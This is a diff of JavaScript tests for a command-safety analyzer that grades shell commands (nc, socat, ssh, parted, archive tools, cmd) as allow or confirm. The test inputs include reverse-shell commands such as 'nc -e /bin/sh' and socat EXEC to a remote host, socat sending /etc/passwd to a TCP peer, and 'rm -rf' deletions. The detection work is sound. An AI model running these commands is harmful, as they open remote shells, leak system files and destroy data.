@@ -316,7 +316,8 @@ test('cmd inline delete family is modeled with cmd semantics', () => {
 })
 
 test('unmodeled cmd text stays a gap and never deletes', () => {
-  for (const args of [['/c', 'echo', 'hi'], ['/c', 'dir', 'C:\\'], ['/c', 'ver'], ['/k', 'rmdir', '/s', '/q', 'X'], []]) {
+  // `/k` without a body is the bare interactive prompt: no text, no fact.
+  for (const args of [['/c', 'echo', 'hi'], ['/c', 'dir', 'C:\\'], ['/c', 'ver'], ['/k'], []]) {
     const result = command('cmd', args)
     assert.deepEqual(result.operations, [], JSON.stringify(args))
     assert.deepEqual(result.candidates, [], JSON.stringify(args))
@@ -1311,5 +1312,399 @@ test('docker without host exposure stays allow after option scanning', async () 
     assert.deepEqual(analysis.operations, [], text)
     assert.deepEqual(analysis.candidates, [], text)
     assert.equal(decision.kind, 'allow', text)
+  }
+})
+
+// --- DSR-032 决定 1: git restore --staged rewrites only the index -----------------
+
+test('git restore --staged produces no worktree fact', async () => {
+  for (const args of [['restore', '--staged', 'a.txt', 'b.txt'], ['restore', '-S', 'a.txt'], ['restore', '--staged', '.']]) {
+    const result = command('git', args)
+    assert.deepEqual(result.operations, [], JSON.stringify(args))
+    assert.deepEqual(result.candidates, [], JSON.stringify(args))
+    const decision = await decideOperations(result.operations)
+    assert.equal(decision.kind, 'allow', JSON.stringify(args))
+  }
+  // No `--staged`, or an explicit worktree selector, stays a worktree restore.
+  for (const args of [['restore', 'a.txt'], ['restore', '-W', 'a.txt'], ['restore', '--worktree', 'a.txt'],
+    ['restore', '--staged', '--worktree', 'a.txt']]) {
+    const operation = command('git', args).operations[0]
+    assert.equal(operation?.action, 'git-restore', JSON.stringify(args))
+    assert.deepEqual(operation?.target, { kind: 'unknown', reason: 'git-evidence' }, JSON.stringify(args))
+  }
+})
+
+// --- DSR-032 决定 3: nc / ncat / socat execution channel and local reads ----------
+
+test('nc, ncat and socat execution channels become dynamic-execution candidates', async () => {
+  for (const [name, args] of [
+    ['nc', ['-e', '/bin/sh', '10.0.0.1', '4444']],
+    ['nc', ['--exec', '/bin/sh', 'host', '1']],
+    ['nc', ['-c', '/bin/sh', 'host', '1']],
+    ['ncat', ['--exec=/bin/sh', 'host', '1']],
+    ['ncat', ['-e', '/bin/sh', 'host', '1']],
+    ['ncat', ['-c', '/bin/sh', 'host', '1']],
+    ['socat', ['TCP-LISTEN:1,fork', 'EXEC:/bin/sh']],
+    ['socat', ['TCP-LISTEN:1,fork', 'SYSTEM:rm -rf /']],
+  ]) {
+    const result = command(name, args)
+    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
+    assert.equal(result.candidates[0]?.kind, 'dynamic-execution', JSON.stringify([name, ...args]))
+    assert.ok(result.candidates[0]?.knownScope?.length > 0, JSON.stringify([name, ...args]))
+    const decision = await decideOperations(result.operations, result.candidates)
+    assert.equal(decision.ruleId, 'execution.dynamic-command', JSON.stringify([name, ...args]))
+  }
+})
+
+test('socat FILE/OPEN addresses read a local path and CREATE writes one', () => {
+  const file = command('socat', ['FILE:/etc/passwd', 'TCP:host:1']).operations[0]
+  assert.equal(file?.action, 'read-content')
+  assert.deepEqual(file?.target, { kind: 'exact', paths: ['/etc/passwd'] })
+  const open = command('socat', ['OPEN:/tmp/x,rdonly', 'TCP:host:1']).operations[0]
+  assert.deepEqual(open?.target, { kind: 'exact', paths: ['/tmp/x'] })
+  const create = command('socat', ['CREATE:/tmp/out', 'TCP:host:1']).operations[0]
+  assert.equal(create?.action, 'write-content')
+  assert.deepEqual(create?.target, { kind: 'exact', paths: ['/tmp/out'] })
+})
+
+test('plain listeners and connections stay allow with zero candidates', () => {
+  for (const [name, args] of [
+    ['nc', ['-l', '8080']],
+    ['nc', ['-l', '-p', '8080']],
+    ['nc', ['host', '8080']],
+    ['ncat', ['-l', '8080']],
+    ['telnet', ['host']],
+    ['socat', ['-h']],
+    ['socat', ['-V']],
+  ]) {
+    const result = command(name, args)
+    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
+    assert.deepEqual(result.candidates, [], JSON.stringify([name, ...args]))
+  }
+})
+
+// --- DSR-032 决定 4 (2nd wave): reverse forwarding / SOCKS are the tunnel facts ---
+
+test('ssh reverse forwarding and SOCKS confirm as unverified effects', async () => {
+  for (const args of [
+    ['-R', '8080:localhost:3082', 'host'],
+    ['-R8080:localhost:3082', 'host'],
+    ['-D', '1080', 'host'],
+    ['-D1080', 'host'],
+  ]) {
+    const result = command('ssh', args)
+    assert.equal(result.candidates[0]?.kind, 'unverified-effect', JSON.stringify(args))
+    assert.ok(result.candidates[0]?.knownScope?.length > 0, JSON.stringify(args))
+    const decision = await decideOperations(result.operations, result.candidates)
+    assert.equal(decision.kind, 'confirm', JSON.stringify(args))
+    assert.equal(decision.ruleId, 'execution.unverified-effect', JSON.stringify(args))
+  }
+})
+
+test('ssh local forwarding, jump hosts, ProxyJump and ordinary remote commands stay allow', () => {
+  for (const args of [['-L', '8080:localhost:80', 'host'], ['host', 'ls'], ['-o', 'BatchMode=yes', 'host', 'ls'],
+    ['-J', 'bastion', 'host'], ['-Jbastion', 'host'], ['-o', 'ProxyJump=bastion', 'host']]) {
+    const result = command('ssh', args)
+    assert.deepEqual(result.operations, [], JSON.stringify(args))
+    assert.deepEqual(result.candidates, [], JSON.stringify(args))
+  }
+})
+
+test('an ssh tunnel and its remote command facts coexist', async () => {
+  const result = command('ssh', ['-R', '8080:localhost:3082', 'host', 'rm', '-rf', '/srv'])
+  assert.equal(result.candidates[0]?.kind, 'unverified-effect')
+  assert.equal(result.children[0]?.source.text, 'rm -rf /srv')
+  assert.equal(result.children[0]?.context.domain, 'ssh')
+})
+
+// --- DSR-032 决定 6: zip -d / --delete removes archive entries --------------------
+
+test('zip -d/--delete confirm the archive entry scope', async () => {
+  for (const args of [['-d', 'out.zip', 'dir/*'], ['--delete', 'out.zip', 'a.txt']]) {
+    const result = command('zip', args)
+    const operation = result.operations[0]
+    assert.equal(operation?.action, 'delete', JSON.stringify(args))
+    assert.equal(operation?.target.kind, 'unknown', JSON.stringify(args))
+    assert.equal(operation?.target.reason, 'zip-entry-delete', JSON.stringify(args))
+    assert.ok(operation?.target.knownScope.includes('out.zip'), JSON.stringify(args))
+    const decision = await decideOperations(result.operations)
+    assert.equal(decision.kind, 'confirm', JSON.stringify(args))
+    assert.equal(decision.ruleId, 'data.delete.dynamic', JSON.stringify(args))
+  }
+  for (const args of [['-d', 'out.zip'], ['-d'], ['-r', 'out.zip', 'src/']]) {
+    const result = command('zip', args)
+    assert.deepEqual(result.operations, [], JSON.stringify(args))
+    assert.deepEqual(result.candidates, [], JSON.stringify(args))
+  }
+})
+
+// --- DSR-032 决定 7: parted interactive session ---------------------------------
+
+test('parted with a device and no subcommand is a device-write entry', async () => {
+  const result = command('parted', ['/dev/sda'])
+  const write = result.operations.find((entry) => entry.action === 'write-content')
+  assert.ok(write)
+  assert.deepEqual(write.target, { kind: 'exact', paths: ['/dev/sda'] })
+  assert.deepEqual(write.details, { deviceMutation: true })
+  assert.equal(result.candidates[0]?.kind, 'unverified-effect')
+  assert.ok(result.candidates[0]?.knownScope?.length > 0)
+  const decision = await decideOperations(result.operations, result.candidates)
+  assert.equal(decision.kind, 'confirm')
+  assert.equal(decision.ruleId, 'execution.unverified-effect')
+  // A script fed on stdin keeps the same argv shape (`printf … | parted /dev/sda`).
+  const piped = command('parted', ['/dev/sda'], { pipeline: { index: 1, source: "printf 'rm 1\\n'" } })
+  assert.ok(piped.operations.some((entry) => entry.action === 'write-content'))
+  assert.equal(piped.candidates[0]?.kind, 'unverified-effect')
+})
+
+test('parted read-only and operand-less forms stay allow', () => {
+  for (const args of [['-l'], ['-m'], ['-v'], ['--version'], ['/dev/sda', 'print'], []]) {
+    const result = command('parted', args)
+    assert.deepEqual(result.operations, [], JSON.stringify(args))
+    assert.deepEqual(result.candidates, [], JSON.stringify(args))
+  }
+})
+
+// --- DSR-032 决定 8: cmd control flow with a deletion family ----------------------
+
+test('cmd control flow plus a deletion family confirms on the literal range', async () => {
+  const result = command('cmd', ['/c', 'if exist x del /s /q x'])
+  const operation = result.operations[0]
+  assert.equal(operation?.action, 'delete')
+  assert.deepEqual(operation?.target.kind, 'unknown')
+  assert.equal(operation?.target.reason, 'cmd-control-flow')
+  assert.ok(operation?.target.knownScope[0].includes('if exist'))
+  const decision = await decideOperations(result.operations)
+  assert.equal(decision.kind, 'confirm')
+  assert.equal(decision.ruleId, 'data.delete.dynamic')
+  // `%VAR%` expansion plus a deletion word is the same confirmed range.
+  const variable = command('cmd', ['/c', 'del /q "%TEMP%\\*.log"'])
+  assert.equal(variable.operations[0]?.target.reason, 'cmd-control-flow')
+  // Control flow without a deletion word keeps the cmd-inline gap (allow).
+  const forLoop = command('cmd', ['/c', 'for %f in (*.txt) do echo %f'])
+  assert.deepEqual(forLoop.operations, [])
+  assert.deepEqual(forLoop.candidates, [])
+  assert.ok(forLoop.gaps.includes('cmd-inline'))
+  // The existing `/s` deletion branch is unchanged (no control-flow marker).
+  const subDirs = command('cmd', ['/c', 'rmdir /s /q build'])
+  assert.equal(subDirs.operations[0]?.target.kind, 'subtree')
+  // The ssh `cmd /c` channel gets the same range fact in its own domain (D2).
+  const sshCmd = command('ssh', ['host', 'cmd.exe', '/c', 'if exist x del /s /q x'])
+  assert.equal(sshCmd.operations[0]?.target.reason, 'cmd-control-flow')
+  assert.equal(sshCmd.operations[0]?.context.domain, 'ssh')
+})
+
+// --- DSR-032 2nd wave: coverage-gap closings and the false positives they brought --
+
+test('netcat and nc.traditional reach the same execution-channel analysis', async () => {
+  for (const [name, args, scope] of [
+    ['netcat', ['-e', '/bin/sh', 'h', '4444'], 'netcat -e /bin/sh'],
+    ['nc.traditional', ['-c', '/bin/sh', 'h', '4444'], 'nc.traditional -c /bin/sh'],
+    ['ncat', ['--sh-exec', '/bin/sh', 'h', '4444'], 'ncat --sh-exec /bin/sh'],
+    ['ncat', ['--sh-exec=/bin/sh', 'h', '4444'], 'ncat --sh-exec /bin/sh'],
+    ['ncat', ['--lua-exec=/bin/sh', 'h', '4444'], 'ncat --lua-exec /bin/sh'],
+    ['nc', ['--exec', '/bin/sh', 'h', '4444'], 'nc --exec /bin/sh'],
+  ]) {
+    const result = command(name, args)
+    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
+    assert.equal(result.candidates[0]?.kind, 'dynamic-execution', JSON.stringify([name, ...args]))
+    assert.deepEqual(result.candidates[0]?.knownScope, [scope], JSON.stringify([name, ...args]))
+    const decision = await decideOperations(result.operations, result.candidates)
+    assert.equal(decision.kind, 'confirm', JSON.stringify([name, ...args]))
+    assert.equal(decision.ruleId, 'execution.dynamic-command', JSON.stringify([name, ...args]))
+  }
+  // The package spellings keep the plain listener/connection allowance.
+  for (const [name, args] of [['netcat', ['-l', '8080']], ['nc.traditional', ['host', '443']]]) {
+    const result = command(name, args)
+    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
+    assert.deepEqual(result.candidates, [], JSON.stringify([name, ...args]))
+  }
+})
+
+test('socat reports execution and file facts only with a network address', async () => {
+  const exec = command('socat', ['TCP:drop.example:443', 'EXEC:/bin/sh'])
+  assert.deepEqual(exec.operations, [])
+  assert.deepEqual(exec.candidates.map((entry) => entry.kind), ['dynamic-execution'])
+  const decision = await decideOperations(exec.operations, exec.candidates)
+  assert.equal(decision.ruleId, 'execution.dynamic-command')
+  // A socat local file address stays a read/write fact when the peer is remote.
+  const file = command('socat', ['TCP:host:1', 'FILE:/etc/passwd']).operations[0]
+  assert.equal(file?.action, 'read-content')
+  assert.deepEqual(file?.target, { kind: 'exact', paths: ['/etc/passwd'] })
+  const create = command('socat', ['UDP:host:1', 'CREATE:/tmp/out']).operations[0]
+  assert.equal(create?.action, 'write-content')
+  // Two local endpoints move nothing off the host: no candidate, no file fact.
+  for (const args of [
+    ['EXEC:cat', 'UNIX-CONNECT:/tmp/x'],
+    ['EXEC:/bin/sh', 'UNIX-CONNECT:/tmp/x'],
+    ['STDIO', 'UNIX-CONNECT:/tmp/local.sock'],
+    ['FILE:/etc/passwd', 'UNIX-CONNECT:/tmp/x'],
+    ['SYSTEM:rm -rf /', 'OPEN:/tmp/x'],
+  ]) {
+    const result = command('socat', args)
+    assert.deepEqual(result.operations, [], JSON.stringify(args))
+    assert.deepEqual(result.candidates, [], JSON.stringify(args))
+  }
+  // The listening network addresses are network addresses.
+  assert.equal(command('socat', ['TCP-LISTEN:1,fork', 'EXEC:/bin/sh']).candidates[0]?.kind, 'dynamic-execution')
+  assert.equal(command('socat', ['UDP4-LISTEN:1', 'SYSTEM:rm -rf /']).candidates[0]?.kind, 'dynamic-execution')
+})
+
+test('ssh ProxyCommand runs its value as local command text', async () => {
+  // The value is a local command line, so its deletion is a host-domain fact.
+  const { analysis, decision } = await evaluatePipeline(`ssh -o ProxyCommand='bash -c "rm -rf /srv/*"' host`)
+  const operation = analysis.operations.find((entry) => entry.action === 'delete')
+  assert.ok(operation, `expected a delete operation, got ${JSON.stringify(analysis.operations)}`)
+  assert.deepEqual(operation.target, { kind: 'pattern', base: '/srv/', pattern: '*', dialect: 'posix' })
+  assert.equal(operation.context.domain, 'host')
+  assert.deepEqual(analysis.candidates, [])
+  assert.equal(decision.kind, 'confirm')
+  assert.equal(decision.ruleId, 'data.delete.dynamic')
+  // A plain connection proxy command proves nothing and stays allow.
+  const plain = await evaluatePipeline("ssh -o ProxyCommand='nc %h %p' host")
+  assert.deepEqual(plain.analysis.operations, [])
+  assert.deepEqual(plain.analysis.candidates, [])
+  assert.equal(plain.decision.kind, 'allow')
+  // The separate and attached `-o` spellings reach the same child unit; neither
+  // one adds the old tunnel candidate.
+  const separate = command('ssh', ['-o', 'ProxyCommand=bash -c "rm -rf /srv/*"', 'host'])
+  assert.deepEqual(separate.children[0]?.source, { kind: 'inline', text: 'bash -c "rm -rf /srv/*"' })
+  assert.deepEqual(separate.candidates, [])
+  const attached = command('ssh', ['-oProxyCommand=nc', 'host'])
+  assert.deepEqual(attached.children[0]?.source, { kind: 'inline', text: 'nc' })
+  assert.equal(attached.children[0]?.language, 'posix')
+  assert.deepEqual(attached.candidates, [])
+})
+
+test('tar --delete and 7z d confirm the archive entry scope', async () => {
+  for (const [name, args, scope] of [
+    ['tar', ['--delete', '-f', 'a.tar', 'member'], ['a.tar', 'member']],
+    ['tar', ['--delete', '--file=a.tar', 'dir/*'], ['a.tar', 'dir/*']],
+    ['7z', ['d', 'a.7z', 'member'], ['a.7z', 'member']],
+    ['7z', ['d', 'a.7z', 'x.txt', 'y.txt'], ['a.7z', 'x.txt', 'y.txt']],
+  ]) {
+    const result = command(name, args)
+    const operation = result.operations[0]
+    assert.equal(operation?.action, 'delete', JSON.stringify([name, ...args]))
+    assert.deepEqual(operation?.target,
+      { kind: 'unknown', reason: 'archive-entry-delete', knownScope: scope }, JSON.stringify([name, ...args]))
+    assert.deepEqual(result.candidates, [], JSON.stringify([name, ...args]))
+    const decision = await decideOperations(result.operations)
+    assert.equal(decision.kind, 'confirm', JSON.stringify([name, ...args]))
+    assert.equal(decision.ruleId, 'data.delete.dynamic', JSON.stringify([name, ...args]))
+  }
+  // A missing archive or member list is a usage error: gap, no fabricated fact.
+  for (const [name, args] of [['tar', ['--delete', '-f', 'a.tar']], ['tar', ['--delete', 'a.tar', 'member']],
+    ['7z', ['d', 'a.7z']], ['7z', ['d']]]) {
+    const result = command(name, args)
+    assert.deepEqual(result.operations, [], JSON.stringify([name, ...args]))
+    assert.deepEqual(result.candidates, [], JSON.stringify([name, ...args]))
+  }
+  // The other tar/7z shapes are unchanged.
+  assert.deepEqual(command('tar', ['-xzf', 'a.tgz']).operations, [])
+  assert.deepEqual(command('tar', ['--remove-files', '-cf', 'o.tar', 'src/']).operations[0].target,
+    { kind: 'subtree', root: 'src/' })
+  assert.deepEqual(command('7z', ['a', 'out.7z', 'src/']).operations, [])
+  assert.deepEqual(command('7z', ['a', '-sdel', 'out.7z', 'src/']).operations[0].target,
+    { kind: 'exact', paths: ['src/'] })
+})
+
+test('parted read abbreviations and a read-only stdin script stay allow', async () => {
+  for (const args of [['/dev/sda', 'p'], ['/dev/sda', 'h'], ['/dev/sda', 'q'], ['/dev/sda', 'u'],
+    ['/dev/sda', 'print'], ['-l']]) {
+    const result = command('parted', args)
+    assert.deepEqual(result.operations, [], JSON.stringify(args))
+    assert.deepEqual(result.candidates, [], JSON.stringify(args))
+  }
+  // Pipeline provenance names the stdin script: `p` prints and cannot write.
+  const read = command('parted', ['/dev/sda'], { pipeline: { index: 1, source: 'printf p\\n' } })
+  assert.deepEqual(read.operations, [])
+  assert.deepEqual(read.candidates, [])
+  // A write script keeps the interactive-session candidate (never silently allows).
+  const write = command('parted', ['/dev/sda'], { pipeline: { index: 1, source: "printf 'rm 1\\n'" } })
+  assert.equal(write.candidates[0]?.kind, 'unverified-effect')
+  assert.ok(write.candidates[0]?.knownScope?.length > 0)
+  // Real PowerShell pipeline: the script words decide, not the device operand.
+  const real = await evaluatePipeline("printf 'p\\n' | parted /dev/sda", { language: 'powershell' })
+  assert.deepEqual(real.analysis.candidates, [])
+  assert.equal(real.decision.kind, 'allow')
+})
+
+test('cmd deletion family is only read in command position', async () => {
+  // `echo`/`rem` argument text is data, even beside a control-flow marker.
+  for (const body of ['for %f in (*.tmp) do echo del %f', 'if exist x echo del /s /q y',
+    'rem rd /s /q C:\\x', 'for %f in (*.txt) do type %f']) {
+    const result = command('cmd', ['/c', body])
+    assert.deepEqual(result.operations, [], body)
+    assert.deepEqual(result.candidates, [], body)
+  }
+  // Command positions: after `do`, inside `( … )`, after `else`, after `start`/`call`,
+  // and after an `if` condition.
+  for (const body of ['for /d %A in (*) do rd /q %A', 'if exist x (del /s /q x) else (del /s /q y)',
+    'echo %PATH% & rd /s /q C:\\build', 'start "" del /q C:\\x', 'call del /q C:\\x', '(del /s /q C:\\x)']) {
+    const result = command('cmd', ['/c', body])
+    assert.equal(result.operations[0]?.target.reason, 'cmd-control-flow', body)
+  }
+  // The real analyzer confirms the for-loop body and keeps the echo body allow.
+  const confirmed = await evaluatePipeline('cmd /c "for /d %A in (*) do rd /q %A"', { language: 'powershell' })
+  assert.equal(confirmed.decision.kind, 'confirm')
+  assert.equal(confirmed.decision.ruleId, 'data.delete.dynamic')
+  assert.deepEqual(confirmed.analysis.candidates, [])
+  const data = await evaluatePipeline('cmd /c "for %f in (*.tmp) do echo del %f"', { language: 'powershell' })
+  assert.deepEqual(data.analysis.operations, [])
+  assert.deepEqual(data.analysis.candidates, [])
+  assert.equal(data.decision.kind, 'allow')
+})
+
+test('cmd /k runs its body through the same control-flow analysis', async () => {
+  const del = command('cmd', ['/k', 'del /s /q C:\\build'])
+  assert.equal(del.operations[0]?.target.reason, 'cmd-del-recursive-match')
+  const delDecision = await decideOperations(del.operations)
+  assert.equal(delDecision.kind, 'confirm')
+  assert.equal(delDecision.ruleId, 'data.delete.dynamic')
+  const flow = command('cmd', ['/k', 'if exist x del /s /q x'])
+  assert.equal(flow.operations[0]?.target.reason, 'cmd-control-flow')
+  // A bare `/k` is the interactive prompt: no body, no fact.
+  const bare = command('cmd', ['/k'])
+  assert.deepEqual(bare.operations, [])
+  assert.deepEqual(bare.candidates, [])
+  assert.ok(bare.gaps.includes('cmd-inline'))
+  // The real analyzer no longer drops the `/k` payload.
+  const { analysis, decision } = await evaluatePipeline('cmd /k "del /s /q C:\\build"', { language: 'powershell' })
+  assert.ok(analysis.operations.some((entry) => entry.action === 'delete'))
+  assert.equal(decision.kind, 'confirm')
+  assert.equal(decision.ruleId, 'data.delete.dynamic')
+})
+
+test('DSR-032 refinement: ordinary usage stays allow with zero candidates', async () => {
+  for (const [text, language] of [
+    ['nc -l 8080', 'bash'],
+    ['nc host 443', 'bash'],
+    ['socat EXEC:cat UNIX-CONNECT:/tmp/x', 'bash'],
+    ['socat STDIO UNIX-CONNECT:/tmp/local.sock', 'bash'],
+    ['ssh -J bastion host', 'bash'],
+    ['ssh -L 8080:localhost:80 host', 'bash'],
+    ["ssh -o ProxyCommand='nc %h %p' host", 'bash'],
+    ['ssh -o ProxyJump=bastion host', 'bash'],
+    ['parted /dev/sda p', 'bash'],
+    ['parted -l', 'bash'],
+    ['zip -r out.zip src/', 'bash'],
+    ['tar -xzf a.tgz', 'bash'],
+    ['7z a out.7z src/', 'bash'],
+    ['cmd /c "echo %PATH%"', 'powershell'],
+    ['cmd /c "for %f in (*.txt) do type %f"', 'powershell'],
+    ['cmd /c dir', 'powershell'],
+  ]) {
+    const { analysis, decision } = await evaluatePipeline(text, { language })
+    assert.deepEqual(analysis.candidates, [], text)
+    assert.deepEqual(analysis.operations.filter((entry) => entry.action === 'delete'), [], text)
+    assert.equal(decision.kind, 'allow', text)
+  }
+  // The tunnel facts that do stay confirmed keep their grade through the pipeline.
+  for (const text of ['ssh -R 8080:localhost:3082 host', 'ssh -D 1080 host']) {
+    const { analysis, decision } = await evaluatePipeline(text)
+    assert.deepEqual(analysis.candidates.map((entry) => entry.kind), ['unverified-effect'], text)
+    assert.equal(decision.kind, 'confirm', text)
+    assert.equal(decision.ruleId, 'execution.unverified-effect', text)
   }
 })
